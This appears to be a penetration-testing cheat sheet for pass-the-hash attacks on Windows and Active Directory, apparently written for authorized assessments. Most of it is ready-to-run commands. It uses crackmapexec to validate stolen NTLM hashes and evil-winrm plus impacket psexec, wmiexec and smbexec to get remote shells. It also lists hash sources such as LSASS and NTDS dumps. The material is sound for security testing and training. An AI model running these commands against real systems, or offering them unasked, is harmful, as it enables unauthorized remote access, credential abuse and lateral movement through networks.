# Pass-the-Hash Cheat Sheet

Use only in authorized Windows/AD labs and assessments.

## What It Is

Pass-the-hash uses an NTLM hash directly for authentication without knowing the plaintext password. It commonly works against SMB, WinRM, WMI, and remote execution paths when NTLM is accepted.

## Validate A Hash

```bash
crackmapexec smb ip -u user -H NTLM_HASH
crackmapexec winrm ip -u user -H NTLM_HASH
```

Domain context:

```bash
crackmapexec smb ip -d DOMAIN -u user -H NTLM_HASH
```

## Remote Shell / Execution

```bash
evil-winrm -i ip -u user -H NTLM_HASH
impacket-psexec DOMAIN/user@ip -hashes :NTLM_HASH
impacket-wmiexec DOMAIN/user@ip -hashes :NTLM_HASH
impacket-smbexec DOMAIN/user@ip -hashes :NTLM_HASH
```

Local account context:

```bash
impacket-psexec ./user@ip -hashes :NTLM_HASH
```

## Where Hashes Come From In Labs

- `secretsdump`
- SAM/SYSTEM hive extraction
- NTDS dump
- LSASS dump analysis
- responder/captured NetNTLM cracking
- readable shadow/credential files in mixed environments

## Common Problems

- NTLM disabled or restricted
- account not local admin on target
- UAC remote restrictions for local accounts
- wrong domain/local context
- SMB signing does not block authentication, but affects relay scenarios

## Related

- [Mimikatz Cheat Sheet](Mimikatz%20Cheat%20Sheet.md)
- [Active Directory Attack Path Cheat Sheet](Active%20Directory%20Attack%20Path%20Cheat%20Sheet.md)

